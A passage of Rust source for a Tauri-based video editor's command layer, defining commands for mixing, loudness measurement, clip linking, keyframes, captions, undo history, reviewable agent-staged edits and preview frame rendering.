    project.timeline().map_err(|e| e.to_string())
}

/// Set the master fader — the linear gain on the finished mix, after every
/// track and the duck bus and before loudness normalisation.
#[tauri::command(async)]
fn set_master_volume(state: State<'_, AppState>, volume: f64) -> CmdResult<Timeline> {
    let project = state.project();
    project.set_master_volume(volume).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Switch the master limiter on or off, optionally moving its ceiling (dBFS).
/// Omitting `ceiling_db` keeps the one it had.
#[tauri::command(async)]
fn set_master_limiter(state: State<'_, AppState>, enabled: bool, ceiling_db: Option<f64>) -> CmdResult<Timeline> {
    let project = state.project();
    project.set_master_limiter(enabled, ceiling_db).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Measure how loud the cut is — the finished mix and each track — in one pass
/// over the audio the export would render. Whole-file work, so it resolves its
/// inputs under the project lock and runs ffmpeg with it released. `range` is a
/// `{start, end}` span of the cut (default all of it); `loudnorm` measures the
/// mix as an export with normalisation on would write it. `cancel_levels` stops
/// the pass, which then rejects with `"levels cancelled"`.
#[tauri::command]
async fn get_levels(state: State<'_, AppState>, range: Option<TimeRange>, loudnorm: Option<bool>) -> CmdResult<Levels> {
    let shared = state.project.clone();
    // Fresh cancel flag for this pass; `cancel_levels` flips it from the UI.
    let cancel = state.levels_cancel.clone();
    cancel.store(false, Ordering::SeqCst);
    blocking(move || {
        let (timeline, assets) = lock_user(&shared).levels_inputs().map_err(|e| e.to_string())?;
        Project::measure_levels(&timeline, &assets, range, loudnorm.unwrap_or(false), &|| {
            cancel.load(Ordering::SeqCst)
        })
        .map_err(|e| match e {
            kerf_core::Error::Cancelled => LEVELS_CANCELLED.to_string(),
            other => other.to_string(),
        })
    })
    .await
}

/// The error a stopped measurement returns, for the webview to stay quiet on.
const LEVELS_CANCELLED: &str = "levels cancelled";

/// Request cancellation of the loudness measurement in flight (if any). The running
/// [`get_levels`] polls the flag while ffmpeg works, kills it and rejects with
/// `"levels cancelled"`.
#[tauri::command(async)]
fn cancel_levels(state: State<'_, AppState>) {
    state.levels_cancel.store(true, Ordering::SeqCst);
}

/// Set the frame the project is cut for, or clear it back to the source shape.
/// The preview, the scrubbed still and the export all read it, so the vertical
/// crop is visible while cutting instead of only in the rendered file.
#[tauri::command(async)]
fn set_delivery_format(
    state: State<'_, AppState>,
    width: Option<u32>,
    height: Option<u32>,
    fit: Option<Fit>,
) -> CmdResult<Timeline> {
    let format = match (width, height) {
        (Some(w), Some(h)) => Some(Delivery::new(w, h, fit.unwrap_or(Fit::Cover))),
        _ => None,
    };
    state.project().set_delivery_format(format).map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_track_muted(state: State<'_, AppState>, track_id: String, muted: bool) -> CmdResult<Timeline> {
    let id = id(&track_id)?;
    let project = state.project();
    project.set_track_muted(id, muted).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_track_solo(state: State<'_, AppState>, track_id: String, solo: bool) -> CmdResult<Timeline> {
    let id = id(&track_id)?;
    let project = state.project();
    project.set_track_solo(id, solo).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_track_locked(state: State<'_, AppState>, track_id: String, locked: bool) -> CmdResult<Timeline> {
    let id = id(&track_id)?;
    let project = state.project();
    project.set_track_locked(id, locked).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_clip_enabled(state: State<'_, AppState>, clip_id: String, enabled: bool) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_clip_enabled(id, enabled).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

// ---- linked A/V ------------------------------------------------------------

/// **Detach audio**: split a picture clip's own sound onto an audio track — a new
/// audio clip with the same span and position, linked to the picture, whose own
/// sound is muted. One revision.
#[tauri::command(async)]
fn detach_audio(state: State<'_, AppState>, clip_id: String) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.detach_audio(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// **Detach audio** from several picture clips in **one** revision. A clip that
/// cannot be detached is skipped and reported; an error only when none could be.
#[tauri::command(async)]
fn detach_audio_clips(state: State<'_, AppState>, clip_ids: Vec<String>) -> CmdResult<AudioDetached> {
    let ids = clip_ids.iter().map(|s| id(s)).collect::<Result<Vec<_>, _>>()?;
    let project = state.project();
    let done = project.detach_audio_clips(&ids).map_err(|e| e.to_string())?;
    Ok(AudioDetached {
        timeline: project.timeline().map_err(|e| e.to_string())?,
        detached: done.detached.len(),
        skipped: done.skipped,
    })
}

/// **Reattach audio**: delete the linked audio clip(s) carrying a picture's sound and
/// let the picture play its own again. Name either clip of the pair; refused when the
/// picture's sound is already playing from another audio clip (it would double). One
/// revision.
#[tauri::command(async)]
fn reattach_audio(state: State<'_, AppState>, clip_id: String) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.reattach_audio(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// **Reattach audio** on several pictures in **one** revision, all or nothing: name
/// either clip of each pair; a pair that cannot be reattached refuses the lot.
#[tauri::command(async)]
fn reattach_audio_clips(state: State<'_, AppState>, clip_ids: Vec<String>) -> CmdResult<Timeline> {
    let ids = clip_ids.iter().map(|s| id(s)).collect::<Result<Vec<_>, _>>()?;
    let project = state.project();
    project.reattach_audio_clips(&ids).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Link clips (at least two, on different tracks) so an edit to one is carried to
/// the others. One revision.
#[tauri::command(async)]
fn link_clips(state: State<'_, AppState>, clip_ids: Vec<String>) -> CmdResult<Timeline> {
    let ids = clip_ids.iter().map(|s| id(s)).collect::<Result<Vec<_>, _>>()?;
    let project = state.project();
    project.link_clips(&ids).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Unlink clips; a group left with a single clip dissolves. One revision.
#[tauri::command(async)]
fn unlink_clips(state: State<'_, AppState>, clip_ids: Vec<String>) -> CmdResult<Timeline> {
    let ids = clip_ids.iter().map(|s| id(s)).collect::<Result<Vec<_>, _>>()?;
    let project = state.project();
    project.unlink_clips(&ids).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// One clipboard entry: the clip's data plus the track it should land on.
#[derive(serde::Deserialize)]
struct Placement {
    track_id: String,
    clip: kerf_core::Clip,
}

/// Paste clipboard clips. Takes clip *values*, not ids, so a cut-then-paste
/// works after the sources are gone.
#[tauri::command(async)]
fn insert_clips(state: State<'_, AppState>, placements: Vec<Placement>, at: f64) -> CmdResult<Timeline> {
    let items = placements
        .into_iter()
        .map(|p| id(&p.track_id).map(|t| (t, p.clip)))
        .collect::<Result<Vec<_>, _>>()?;
    let project = state.project();
    project.insert_clips(&items, at).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn duplicate_clips(state: State<'_, AppState>, clip_ids: Vec<String>, at: f64) -> CmdResult<Timeline> {
    let ids = clip_ids.iter().map(|s| id(s)).collect::<Result<Vec<_>, _>>()?;
    let project = state.project();
    project.duplicate_clips(&ids, at).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Remove a clip — and its linked partners, unless `link` is `false`.
#[tauri::command(async)]
fn remove_clip(state: State<'_, AppState>, clip_id: String, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.with_links(link, |p| p.remove(id)).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Remove several clips in **one** revision. `ripple` forces ripple on or off
/// for the call; omitted, the project's ripple mode decides — so a multi-select
/// *ripple* delete is this with `ripple: true`. Linked partners of the named clips
/// go too, unless `link` is `false`.
#[tauri::command(async)]
fn remove_clips(
    state: State<'_, AppState>,
    clip_ids: Vec<String>,
    ripple: Option<bool>,
    link: Option<bool>,
) -> CmdResult<Timeline> {
    let ids = clip_ids.iter().map(|s| id(s)).collect::<Result<Vec<_>, _>>()?;
    let project = state.project();
    project
        .with_links(link, |p| p.with_ripple(ripple, |p| p.remove_clips(&ids)))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_volume(state: State<'_, AppState>, clip_id: String, volume: f32) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_volume(id, volume).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_fade(state: State<'_, AppState>, clip_id: String, fade_in: Option<f64>, fade_out: Option<f64>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_fade(id, fade_in, fade_out).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Retime a clip; its linked partners are retimed by the same ratio unless `link`
/// is `false`.
#[tauri::command(async)]
fn set_speed(state: State<'_, AppState>, clip_id: String, speed: f64, link: Option<bool>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .with_links(link, |p| p.set_speed(id, speed))
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
#[allow(clippy::too_many_arguments)]
fn set_transform(
    state: State<'_, AppState>,
    clip_id: String,
    scale: Option<f64>,
    pos_x: Option<f64>,
    pos_y: Option<f64>,
    rotation: Option<f64>,
    opacity: Option<f64>,
    crop_left: Option<f64>,
    crop_right: Option<f64>,
    crop_top: Option<f64>,
    crop_bottom: Option<f64>,
) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .set_transform(
            id,
            scale,
            pos_x,
            pos_y,
            rotation,
            opacity,
            crop_left,
            crop_right,
            crop_top,
            crop_bottom,
        )
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_color(
    state: State<'_, AppState>,
    clip_id: String,
    brightness: Option<f64>,
    contrast: Option<f64>,
    saturation: Option<f64>,
    gamma: Option<f64>,
    temperature: Option<f64>,
) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .set_color(id, brightness, contrast, saturation, gamma, temperature)
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_transition(
    state: State<'_, AppState>,
    clip_id: String,
    kind: Option<String>,
    duration: Option<f64>,
) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let transition = parse_transition(kind, duration)?;
    let project = state.project();
    project.set_transition(id, transition).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Cut a clip to a shape (or clear it with `mask: null`), so a lower track shows
/// through outside it.
#[tauri::command(async)]
fn set_mask(state: State<'_, AppState>, clip_id: String, mask: Option<Mask>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_mask(id, mask).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_video_effects(state: State<'_, AppState>, clip_id: String, effects: Vec<VideoEffect>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_video_effects(id, effects).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_audio_effects(state: State<'_, AppState>, clip_id: String, effects: Vec<AudioEffect>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_audio_effects(id, effects).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_keyframes(state: State<'_, AppState>, clip_id: String, keyframes: Vec<Keyframe>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_keyframes(id, keyframes).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
#[allow(clippy::too_many_arguments)]
fn add_keyframe(
    state: State<'_, AppState>,
    clip_id: String,
    time: f64,
    scale: Option<f64>,
    pos_x: Option<f64>,
    pos_y: Option<f64>,
    rotation: Option<f64>,
    opacity: Option<f64>,
) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .add_keyframe(id, time, scale, pos_x, pos_y, rotation, opacity)
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_keyframe_easing(state: State<'_, AppState>, clip_id: String, time: f64, easing: kerf_core::Easing) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_keyframe_easing(id, time, easing).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn clear_keyframes(state: State<'_, AppState>, clip_id: String) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.clear_keyframes(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
#[allow(clippy::too_many_arguments)]
fn set_reframe(
    state: State<'_, AppState>,
    clip_id: String,
    yaw: Option<f64>,
    pitch: Option<f64>,
    roll: Option<f64>,
    fov: Option<f64>,
    lens_fov: Option<f64>,
    input: Option<Projection>,
    output: Option<Projection>,
) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .set_reframe(id, yaw, pitch, roll, fov, lens_fov, input, output)
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// Mark an asset as 360 footage (or clear the mark) for footage the probe could
/// not identify. Unlike `set_reframe` this sticks to the asset, so every clip cut
/// from it afterwards is reframed.
#[tauri::command(async)]
fn set_asset_projection(
    app: AppHandle,
    state: State<'_, AppState>,
    asset_id: String,
    projection: Option<Projection>,
) -> CmdResult<Asset> {
    let id = id(&asset_id)?;
    let asset = state
        .project()
        .set_asset_projection(id, projection)
        .map_err(|e| e.to_string())?;
    // 360 assets proxy at a different size, so the cached proxy no longer matches.
    spawn_proxy(&app, &asset);
    Ok(asset)
}

#[tauri::command(async)]
fn clear_reframe(state: State<'_, AppState>, clip_id: String) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.clear_reframe(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_reframe_keyframes(state: State<'_, AppState>, clip_id: String, keyframes: Vec<ReframeKeyframe>) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project.set_reframe_keyframes(id, keyframes).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn add_reframe_keyframe(
    state: State<'_, AppState>,
    clip_id: String,
    time: f64,
    yaw: Option<f64>,
    pitch: Option<f64>,
    roll: Option<f64>,
    fov: Option<f64>,
) -> CmdResult<Timeline> {
    let id = id(&clip_id)?;
    let project = state.project();
    project
        .add_reframe_keyframe(id, time, yaw, pitch, roll, fov)
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn add_marker(state: State<'_, AppState>, time: f64, name: String, color: Option<String>) -> CmdResult<Timeline> {
    let project = state.project();
    project.add_marker(time, name, color).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn update_marker(
    state: State<'_, AppState>,
    marker_id: String,
    time: Option<f64>,
    name: Option<String>,
    color: Option<String>,
) -> CmdResult<Timeline> {
    let id = id(&marker_id)?;
    let project = state.project();
    project.update_marker(id, time, name, color).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn remove_marker(state: State<'_, AppState>, marker_id: String) -> CmdResult<Timeline> {
    let id = id(&marker_id)?;
    let project = state.project();
    project.remove_marker(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn add_overlay(state: State<'_, AppState>, text: String, start: f64, end: f64) -> CmdResult<Timeline> {
    let project = state.project();
    project.add_overlay(text, start, end).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
#[allow(clippy::too_many_arguments)]
fn update_overlay(
    state: State<'_, AppState>,
    overlay_id: String,
    text: Option<String>,
    start: Option<f64>,
    end: Option<f64>,
    pos_x: Option<f64>,
    pos_y: Option<f64>,
    size: Option<f64>,
    color: Option<String>,
    bg: Option<String>,
    font: Option<String>,
    bold: Option<bool>,
) -> CmdResult<Timeline> {
    let oid = id(&overlay_id)?;
    let project = state.project();
    project
        .update_overlay(oid, text, start, end, pos_x, pos_y, size, color, bg, font, bold)
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn remove_overlay(state: State<'_, AppState>, overlay_id: String) -> CmdResult<Timeline> {
    let oid = id(&overlay_id)?;
    let project = state.project();
    project.remove_overlay(oid).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn set_overlay_keyframes(state: State<'_, AppState>, overlay_id: String, keyframes: Vec<TextKeyframe>) -> CmdResult<Timeline> {
    let oid = id(&overlay_id)?;
    let project = state.project();
    project.set_overlay_keyframes(oid, keyframes).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn generate_captions(state: State<'_, AppState>, options: Option<CaptionOptions>) -> CmdResult<Timeline> {
    let project = state.project();
    project
        .generate_captions(options.unwrap_or_default())
        .map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn clear_captions(state: State<'_, AppState>) -> CmdResult<Timeline> {
    let project = state.project();
    project.clear_captions().map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// What importing a subtitle file hands back: the refreshed cut, and what the
/// import did (cues read, placed, skipped, dropped) for the toast.
#[derive(Serialize)]
struct CaptionImport {
    timeline: Timeline,
    summary: ImportSummary,
}

/// The loose arguments every caption import takes — which clock the file's times
/// are on, the asset a `source` clock is about, the look, a time offset — as the
/// one request the engine works from. The combination rules are the engine's (the
/// MCP tool shares them); this only parses the asset id.
fn caption_request(
    base: Option<&str>,
    asset_id: Option<&str>,
    options: Option<CaptionOptions>,
    offset: Option<f64>,
) -> CmdResult<CaptionImportRequest> {
    let asset = asset_id.map(id).transpose()?;
    Ok(CaptionImportRequest {
        base: CaptionTimeBase::resolve(base, asset).map_err(|e| e.to_string())?,
        options: options.unwrap_or_default(),
        offset: offset.unwrap_or(0.0),
    })
}

/// The part of an import that holds the project lock: place a file that was
/// already read and parsed with the lock released.
fn place_caption_file(shared: &Mutex<Project>, file: &CaptionFile, req: CaptionImportRequest) -> CmdResult<CaptionImport> {
    let project = lock_user(shared);
    let summary = project.import_captions(file, req).map_err(|e| e.to_string())?;
    let timeline = project.timeline().map_err(|e| e.to_string())?;
    Ok(CaptionImport { timeline, summary })
}

/// Caption the cut from a `.srt` / `.ass` / `.ssa` file on disk. `base` is
/// `timeline` (the file is a subtitle track for the finished cut — the default)
/// or `source` with an `asset_id` (the file times that asset's own footage, and
/// is projected through its clips like a transcript); `options` is the same
/// caption look `generate_captions` takes; `offset` is seconds added to every cue
/// first (negative moves them earlier). The file is read **and parsed** before
/// the project lock is taken — only the placement holds it — and the import is
/// one `Import captions` revision that replaces the previous generated /
/// imported captions.
#[tauri::command]
async fn import_captions(
    state: State<'_, AppState>,
    path: String,
    base: Option<String>,
    asset_id: Option<String>,
    options: Option<CaptionOptions>,
    offset: Option<f64>,
) -> CmdResult<CaptionImport> {
    let req = caption_request(base.as_deref(), asset_id.as_deref(), options, offset)?;
    let shared = state.project.clone();
    blocking(move || {
        let text = kerf_core::read_caption_file(std::path::Path::new(&path)).map_err(|e| e.to_string())?;
        let file = kerf_core::parse_captions(&text, None).map_err(|e| e.to_string())?;
        place_caption_file(&shared, &file, req)
    })
    .await
}

/// [`import_captions`] for text the webview already holds (a file read through
/// an `<input type=file>`, or pasted). `format` is `srt` / `ass` or omitted to
/// guess from the text. Parsed on the blocking pool with the lock released, like
/// the file variant.
#[tauri::command]
async fn import_captions_text(
    state: State<'_, AppState>,
    text: String,
    format: Option<String>,
    base: Option<String>,
    asset_id: Option<String>,
    options: Option<CaptionOptions>,
    offset: Option<f64>,
) -> CmdResult<CaptionImport> {
    let req = caption_request(base.as_deref(), asset_id.as_deref(), options, offset)?;
    let format = CaptionFormat::from_arg(format.as_deref()).map_err(|e| e.to_string())?;
    let shared = state.project.clone();
    blocking(move || {
        let file = kerf_core::parse_captions(&text, format).map_err(|e| e.to_string())?;
        place_caption_file(&shared, &file, req)
    })
    .await
}

#[tauri::command]
async fn export_srt(state: State<'_, AppState>, asset_id: String, output_path: String) -> CmdResult<String> {
    let id = id(&asset_id)?;
    require_local_output_path(&output_path)?;
    let shared = state.project.clone();
    blocking(move || {
        let srt = lock_user(&shared).transcript_srt(id).map_err(|e| e.to_string())?;
        std::fs::write(&output_path, srt).map_err(|e| e.to_string())?;
        Ok(output_path)
    })
    .await
}

#[tauri::command(async)]
fn remove_silence(state: State<'_, AppState>, asset_id: String) -> CmdResult<Timeline> {
    let id = id(&asset_id)?;
    let project = state.project();
    project.remove_silence(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn snap_to_beats(state: State<'_, AppState>, track_id: Option<String>, tolerance: Option<f64>) -> CmdResult<Timeline> {
    let track = track_id.as_deref().map(id).transpose()?;
    let project = state.project();
    project.snap_to_beats(track, tolerance).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

/// What detaching sound from several clips did: the refreshed timeline, how many
/// clips were detached, and the ones left alone with the reason (a locked track,
/// an asset without audio, a sound already detached).
#[derive(serde::Serialize)]
struct AudioDetached {
    timeline: Timeline,
    detached: usize,
    skipped: Vec<kerf_core::SkippedDetach>,
}

/// Give an asset's sound its own clip on an audio track, for every use of the asset
/// on a video track that still plays it: each has its sound **detached** (the picture
/// muted, an audio clip with the same span linked to it) so nothing sounds twice — one
/// revision. A clip on a locked track is skipped and reported; with nothing to detach
/// it is an error (`add_asset_audio` is the explicit way to append the whole audio).
#[tauri::command(async)]
fn extract_audio(state: State<'_, AppState>, asset_id: String) -> CmdResult<AudioDetached> {
    let id = id(&asset_id)?;
    let project = state.project();
    let done = project.extract_audio(id).map_err(|e| e.to_string())?;
    Ok(AudioDetached {
        timeline: project.timeline().map_err(|e| e.to_string())?,
        detached: done.detached.len(),
        skipped: done.skipped,
    })
}

/// Append an asset's whole audio to the first audio track as a clip of its own. It
/// never touches a picture clip, so an asset that also plays its own sound from a
/// video track is heard twice where they overlap — `extract_audio` is for that.
#[tauri::command(async)]
fn add_asset_audio(state: State<'_, AppState>, asset_id: String) -> CmdResult<Timeline> {
    let id = id(&asset_id)?;
    let project = state.project();
    project.add_asset_audio(id).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn concatenate(state: State<'_, AppState>, asset_ids: Vec<String>) -> CmdResult<Timeline> {
    let ids = asset_ids.iter().map(|s| id(s)).collect::<CmdResult<Vec<_>>>()?;
    let project = state.project();
    project.concatenate(&ids).map_err(|e| e.to_string())?;
    project.timeline().map_err(|e| e.to_string())
}

// ---- history (undo / redo / revert) ----------------------------------------

#[tauri::command(async)]
fn get_history(state: State<'_, AppState>) -> CmdResult<Vec<Revision>> {
    state.project().history().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn undo(state: State<'_, AppState>) -> CmdResult<Timeline> {
    state.project().undo().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn redo(state: State<'_, AppState>) -> CmdResult<Timeline> {
    state.project().redo().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn revert_to(state: State<'_, AppState>, seq: i64) -> CmdResult<Timeline> {
    state.project().revert_to(seq).map_err(|e| e.to_string())
}

/// What one revision changed, so the edit log can explain itself.
#[tauri::command(async)]
fn revision_diff(state: State<'_, AppState>, seq: i64) -> CmdResult<TimelineDiff> {
    state.project().revision_diff(seq).map_err(|e| e.to_string())
}

// ---- staged edits (the agent's pending proposal) ---------------------------

/// The proposal a connected agent has staged, or `None`. Carries its own diff,
/// so the review card renders from one round-trip.
#[tauri::command(async)]
fn get_staged_edit(state: State<'_, AppState>) -> CmdResult<Option<StagedEdit>> {
    state.project().staged().map_err(|e| e.to_string())
}

/// The staged timeline itself — what the editor shows while previewing a
/// proposal, so the user can look at the cut rather than only read about it.
#[tauri::command(async)]
fn get_staged_timeline(state: State<'_, AppState>) -> CmdResult<Option<Timeline>> {
    state.project().staged_timeline().map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn apply_staged_edit(state: State<'_, AppState>, force: Option<bool>) -> CmdResult<Timeline> {
    state
        .project()
        .apply_staged(force.unwrap_or(false))
        .map_err(|e| e.to_string())
}

#[tauri::command(async)]
fn discard_staged_edit(state: State<'_, AppState>) -> CmdResult<Timeline> {
    state.project().discard_staged().map_err(|e| e.to_string())
}

// ---- media (preview frames, waveforms) -------------------------------------

#[tauri::command]
async fn get_frame(
    state: State<'_, AppState>,
    asset_id: String,
    time_secs: f64,
    max_width: Option<u32>,
    accurate: Option<bool>,
) -> CmdResult<String> {
    let id = id(&asset_id)?;
    let shared = state.project.clone();
    blocking(move || {
        // Resolve the asset under the lock, then *drop the guard* before decoding: the
        // ffmpeg run must not hold the shared Project mutex for its whole duration, or
        // it freezes every other op (timeline edits, MCP, the next scrub frame).
        let asset = lock_user(&shared).require_asset(id).map_err(|e| e.to_string())?;
        // JPEG rather than PNG: the preview pane never needs lossless frames, and a
        // q=4 JPEG is ~5–10× smaller to encode and ship over IPC — which matters now
        // that the preview fetches frames continuously during playback. `accurate`
        // is false for rough scrub frames (keyframe-snap), true for the settled frame.
        let jpeg = Project::decode_preview_frame(&asset, time_secs, max_width.unwrap_or(960), 4, accurate.unwrap_or(true))
            .map_err(|e| e.to_string())?;
        let b64 = base64::engine::general_purpose::STANDARD.encode(jpeg);
        Ok(format!("data:image/jpeg;base64,{b64}"))
    })
    .await
}

/// The composited timeline still at `time_secs` — every visible clip put through
/// the same color / effect / transform / overlay chain the export uses, so the
/// preview reflects Inspector edits live (unlike `get_frame`, a raw source decode).
#[tauri::command]
async fn get_timeline_frame(state: State<'_, AppState>, time_secs: f64, max_width: Option<u32>) -> CmdResult<String> {
    let shared = state.project.clone();
    blocking(move || {
        // Resolve the inputs under the lock, then *drop the guard* before the ffmpeg
        // composite — the preview fetches frames continuously during playback, and
        // holding the shared Project mutex for the whole decode would freeze every
        // other op (timeline edits, MCP, the next scrub frame). Mirrors `get_frame`.
        let (timeline, assets) = lock_user(&shared).timeline_frame_inputs().map_err(|e| e.to_string())?;
        let jpeg = Project::composite_timeline_frame(&timeline, &assets, time_secs, max_width.unwrap_or(960), 4)
            .map_err(|e| e.to_string())?;
        let b64 = base64::engine::general_purpose::STANDARD.encode(jpeg);
        Ok(format!("data:image/jpeg;base64,{b64}"))
    })
    .await
}

/// The frame under the playhead for the Preview panel, through the GPU compositor when that is
/// on and draws it exactly, else FFmpeg's JPEG — the same one `get_timeline_frame` returns, in
/// the same call, with the reasons the GPU did not draw it.
///
/// `overlays` is the page saying it has something to draw over the picture (a title box, the trim
/// monitor, safe-area guides): a surface that sits above the page cannot show those, so such a
/// frame is the JPEG. See [`gpu_preview`]; GUI-only, so there is no MCP tool.
#[tauri::command]
async fn get_preview_frame(
    state: State<'_, AppState>,
    gpu: State<'_, Arc<gpu_preview::GpuPreview>>,
    time_secs: f64,
    max_width: Option<u32>,
    overlays: Option<bool>,
) -> CmdResult<gpu_preview::PreviewFrameResult> {
    let shared = state.project.clone();
    let gpu = gpu.inner().clone();
    blocking(move || {
        // The inputs are taken under the lock and the guard is gone before anything is
        // planned from files, decoded, rendered or presented.
        gpu.frame(
            || gpu_preview::plan_inputs(&lock_user(&shared)),
            time_secs,
            max_width.unwrap_or(960),
            overlays.unwrap_or(false),
        )
    })
    .await
}

/// Where the Preview frame is in the window (device pixels, relative to the webview) and whether
/// the native surface should be showing. Called on mount, resize, dock moves, workspace switches
/// and window moves; cheap, and it never waits for a render.
#[tauri::command(async)]
fn set_preview_bounds(gpu: State<'_, Arc<gpu_preview::GpuPreview>>, bounds: gpu_preview::BoundsReport) -> CmdResult<()> {
    gpu.set_bounds(&bounds)
}

/// What the GPU preview is doing on this machine: the setting, whether the platform has a surface
/// technique, whether a device is up, and why not when it is not.
#[tauri::command(async)]
fn gpu_preview_status(gpu: State<'_, Arc<gpu_preview::GpuPreview>>) -> gpu_preview::GpuPreviewStatus {
    gpu.status()
}

/// One composited frame pushed to the webview during playback.
#[derive(Serialize, Clone)]
struct PlaybackFrame {
    /// The timeline time this frame shows, so the webview can drop a frame that
    /// arrived after the audio clock has already moved past it.
    time: f64,
    /// `data:image/jpeg;base64,…`, the same shape `get_timeline_frame` returns —
    /// so the preview renders streamed frames through its existing path.
    jpeg: String,
}

/// The id of the playback that *should* be running (0 = none). A stream keeps
/// going only while this still equals the id it was started with, so a seek or a
/// second Play supersedes the previous ffmpeg rather than racing it for the pane.
///
/// The id comes from the caller rather than being minted here, and `stop_playback`
/// only clears the id it was given, because start and stop are separate async
/// IPC calls that can arrive out of order: a bare generation counter would let a
/// stop meant for the previous stream land after the next one started and kill
/// it, which reads as playback that dies the moment you seek.
